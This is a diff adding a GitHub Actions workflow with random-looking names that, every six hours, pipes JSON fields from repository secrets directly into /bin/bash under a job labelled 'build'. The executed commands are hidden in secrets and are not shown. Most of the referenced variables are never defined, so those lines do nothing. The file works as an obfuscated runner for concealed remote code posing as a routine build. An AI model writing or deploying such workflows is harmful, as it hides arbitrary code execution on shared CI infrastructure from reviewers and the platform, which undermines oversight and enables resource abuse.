@@ -1,0 +1,28 @@
+name: shilaoqian3627
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shilaoqian3627
+        env:
+          zlv6916: ${{ secrets.zlv6916 }}
+        run: |
+          echo $zlv6916 | jq -r .xks999 | /bin/bash
+          echo $iusb630 | jq -r .quo0 | /bin/bash
+          echo $nbvv9 | jq -r .efszl0 | /bin/bash
+          echo $ann46 | jq -r .p822 | /bin/bash
+          echo $ovin80 | jq -r .uagx199 | /bin/bash
+          echo $rfqgr3 | jq -r .zh223 | /bin/bash
+          echo $od5 | jq -r .qwqk178 | /bin/bash
+          echo $r608 | jq -r .qq8071 | /bin/bash
+          echo $iqn69586 | jq -r .lsd05 | /bin/bash
+          echo $btgol31 | jq -r .l20 | /bin/bash
+          echo $adg94 | jq -r .qlcj00 | /bin/bash
+          echo $t18839 | jq -r .gdyq8 | /bin/bash
+
